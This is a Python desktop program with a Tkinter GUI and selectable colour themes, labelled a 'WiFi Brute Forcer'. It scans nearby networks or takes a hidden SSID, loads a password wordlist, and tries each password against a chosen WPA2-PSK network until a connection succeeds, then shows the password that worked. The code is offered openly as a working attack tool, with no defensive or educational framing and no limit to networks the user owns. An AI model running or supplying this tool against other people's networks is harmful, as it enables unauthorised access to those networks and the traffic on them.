import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox

try:
    import pywifi
    from pywifi import const
except ImportError:
    raise ImportError("pywifi is required on Windows. Install with 'pip install pywifi'")

import themes # Import the themes module

class WifiBruteForcer:
    def __init__(self, master):
        self.master = master
        master.title("WiFi Brute Forcer (Windows)")
        master.geometry("550x580") # Adjusted for theme selector & padding

        self.current_theme_name = themes.get_season()
        if self.current_theme_name not in themes.THEMES:
            self.current_theme_name = "dark" # Fallback
        themes.set_current_theme_name(self.current_theme_name)

        # --- Theme Selector ---
        self.theme_frame = tk.Frame(master)
        self.theme_label = tk.Label(self.theme_frame, text="Theme:")
        self.theme_label.pack(side=tk.LEFT, padx=5)
        self.theme_var = tk.StringVar(master)
        self.theme_var.set(self.current_theme_name.capitalize())
        theme_options = [name.capitalize() for name in themes.THEMES.keys()]
        self.theme_menu = tk.OptionMenu(self.theme_frame, self.theme_var, *theme_options, command=self.change_theme)
        self.theme_menu.pack(side=tk.LEFT)
        self.theme_frame.pack(pady=10, padx=10, anchor='w')

        # Hidden SSID toggle
        self.hidden_var = tk.BooleanVar()
        self.hidden_frame = tk.Frame(master)
        self.hidden_checkbutton = tk.Checkbutton(self.hidden_frame, text="Hidden SSID", variable=self.hidden_var,
                                                 command=self._toggle_hidden)
        self.hidden_checkbutton.pack(side=tk.LEFT)
        self.manual_ssid_label = tk.Label(self.hidden_frame, text="Manual SSID:")
        self.manual_ssid_label.pack(side=tk.LEFT, padx=(10,0))
        self.ssid_entry = tk.Entry(self.hidden_frame, width=30, state=tk.DISABLED)
        self.ssid_entry.pack(side=tk.LEFT, padx=5)
        self.hidden_frame.pack(pady=5, padx=10, fill=tk.X)

        # Scan and list
        self.scan_btn = tk.Button(master, text="Scan Networks", command=self.scan_networks)
        self.scan_btn.pack(pady=5)

        self.network_listbox = tk.Listbox(master, selectmode=tk.SINGLE, width=60, height=8)
        self.network_listbox.pack(pady=5, padx=10, fill=tk.X, expand=True)

        # Dictionary load
        self.load_dict_btn = tk.Button(master, text="Load Dictionary", command=self.load_dictionary)
        self.load_dict_btn.pack(pady=5)

        self.dict_label = tk.Label(master, text="No dictionary loaded")
        self.dict_label.pack(pady=5)

        # Start button
        self.start_btn = tk.Button(master, text="Start Brute Force", command=self.start_bruteforce)
        self.start_btn.pack(pady=10)

        # Status label
        self.status_label = tk.Label(master, text="Status: Idle")
        self.status_label.pack(pady=10)

        # Initialize wifi
        wifi = pywifi.PyWiFi()
        self.iface = wifi.interfaces()[0]
        self.networks = []
        self.dictionary = []

        self.apply_current_theme() # Apply theme after all widgets are created

    def change_theme(self, selected_theme_capitalized):
        new_theme_name = selected_theme_capitalized.lower()
        themes.set_current_theme_name(new_theme_name)
        self.current_theme_name = new_theme_name
        self.apply_current_theme()

    def apply_current_theme(self):
        current_palette = themes.get_current_theme()
        self.master.configure(bg=current_palette.get("bg_color"))

        themes.apply_recursively(self.master, current_palette)

        if hasattr(self, 'theme_menu'):
            self.theme_menu.config(
                bg=current_palette.get("btn_bg"),
                fg=current_palette.get("fg_color"),
                activebackground=current_palette.get("btn_active_bg"),
                highlightthickness=0
            )
            menu_widget_name = self.theme_menu.menuname
            try:
                menu = self.theme_menu.nametowidget(menu_widget_name)
                menu.config(
                    bg=current_palette.get("entry_bg"),
                    fg=current_palette.get("fg_color"),
                    activebackground=current_palette.get("select_bg"),
                    activeforeground=current_palette.get("fg_color"),
                    relief=tk.FLAT
                )
            except tk.TclError:
                 # This can happen if the menu hasn't been created yet or is destroyed.
                pass # Silently ignore, or log if necessary

        self._update_widget_states_for_theme()

    def _update_widget_states_for_theme(self):
        current_palette = themes.get_current_theme()

        # SSID Entry
        if self.ssid_entry.cget('state') == tk.DISABLED:
            self.ssid_entry.config(
                disabledbackground=current_palette.get("entry_bg"),
                disabledforeground=current_palette.get("fg_color") # Consider a dimmer color for text if needed
            )
        else: # NORMAL
            self.ssid_entry.config(
                bg=current_palette.get("entry_bg"),
                fg=current_palette.get("fg_color"),
                insertbackground=current_palette.get("fg_color")
            )

        # Network Listbox - state handling is mostly visual through bg/fg
        # Tkinter Listbox doesn't have disabledbackground/disabledforeground
        # Its appearance when "disabled" (i.e., not interactive) is controlled by its standard bg/fg.
        self.network_listbox.config(
            bg=current_palette.get("listbox_bg"),
            fg=current_palette.get("fg_color"),
            selectbackground=current_palette.get("select_bg"),
            selectforeground=current_palette.get("fg_color") # Ensure selected item text is also themed
        )

    def _toggle_hidden(self):
        is_hidden = self.hidden_var.get()
        new_ssid_state = tk.NORMAL if is_hidden else tk.DISABLED
        new_scan_btn_state = tk.DISABLED if is_hidden else tk.NORMAL
        # Network listbox state is conceptually linked to scan button usability
        new_listbox_state = tk.DISABLED if is_hidden else tk.NORMAL


        self.ssid_entry.config(state=new_ssid_state)
        self.scan_btn.config(state=new_scan_btn_state)
        # For Listbox, 'state' isn't a standard option affecting appearance directly like Entry.
        # Its interactivity is implicitly controlled by disabling scan_btn.
        # We'll rely on _update_widget_states_for_theme to set its appearance.

        if not is_hidden:
            self.ssid_entry.delete(0, tk.END)

        self.apply_current_theme()

    def scan_networks(self):
        self.network_listbox.delete(0, tk.END)
        self.status_label.config(text="Status: Scanning...")
        # Ensure status label is themed immediately
        if hasattr(self, 'current_theme_name'): # Check if theming is initialized
             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
        try:
            self.iface.scan()
            time.sleep(2)
            results = self.iface.scan_results()
            ssids = sorted({net.ssid for net in results if net.ssid})
            self.networks = ssids
            for ssid in ssids:
                self.network_listbox.insert(tk.END, ssid)
            self.status_label.config(text=f"Status: Found {len(ssids)} networks")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {e}")
            self.status_label.config(text="Status: Error scanning")
        finally:
            if hasattr(self, 'current_theme_name'): # Re-apply theme to status label
                 themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())


    def load_dictionary(self):
        path = filedialog.askopenfilename(title="Select dictionary file",
                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.dictionary = [line.strip() for line in f if line.strip()]
            self.dict_label.config(text=f"Dictionary: {path} ({len(self.dictionary)} entries)")
            if hasattr(self, 'current_theme_name'): # Theme dict_label
                 themes.apply_theme_to_widget(self.dict_label, themes.get_current_theme())


    def start_bruteforce(self):
        if self.hidden_var.get():
            ssid = self.ssid_entry.get().strip()
            if not ssid:
                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
                return
        else:
            sel = self.network_listbox.curselection()
            if not sel:
                messagebox.showwarning("Warning", "Please select a network to attack.")
                return
            ssid = self.networks[sel[0]]

        if not self.dictionary:
            messagebox.showwarning("Warning", "Please load a password dictionary.")
            return

        t = threading.Thread(target=self.bruteforce, args=(ssid, self.hidden_var.get()))
        t.daemon = True
        t.start()

    def bruteforce(self, ssid, hidden):
        self.status_label.config(text=f"Status: Attacking {ssid}...")
        if hasattr(self, 'current_theme_name'):
             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())

        for pwd_idx, pwd in enumerate(self.dictionary):
            # Update status label for each attempt, ensuring it's themed.
            # This is important because this runs in a thread.
            # We need to schedule the GUI update on the main thread if issues arise,
            # but for simple label text changes, Tkinter is often tolerant.
            # However, direct widget configuration from threads is not strictly safe.
            # A safer way would be to use master.after or a queue.
            # For now, keeping it simple:
            self.master.after(0, lambda: self.status_label.config(text=f"Trying: {pwd}"))
            if hasattr(self, 'current_theme_name'):
                 self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))


            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            if hidden:
                try:
                    profile.hidden = True
                except AttributeError:
                    pass # Older pywifi might not have this

            self.iface.remove_all_network_profiles()
            tmp = self.iface.add_network_profile(profile)
            self.iface.connect(tmp)
            time.sleep(3) # Connection attempt timeout

            if self.iface.status() == const.IFACE_CONNECTED:
                self.master.after(0, lambda: messagebox.showinfo("Success", f"Connected! SSID: {ssid}\nPassword: {pwd}"))
                self.master.after(0, lambda: self.status_label.config(text="Status: Success"))
                if hasattr(self, 'current_theme_name'):
                    self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
                return
            else:
                self.iface.disconnect()
                time.sleep(1) # Brief pause after disconnect

        self.master.after(0, lambda: messagebox.showinfo("Finished", f"Brute force complete for {ssid}, no password found."))
        self.master.after(0, lambda: self.status_label.config(text="Status: Finished"))
        if hasattr(self, 'current_theme_name'):
            self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))


if __name__ == "__main__":
    root = tk.Tk()
    app = WifiBruteForcer(root)
    root.mainloop()
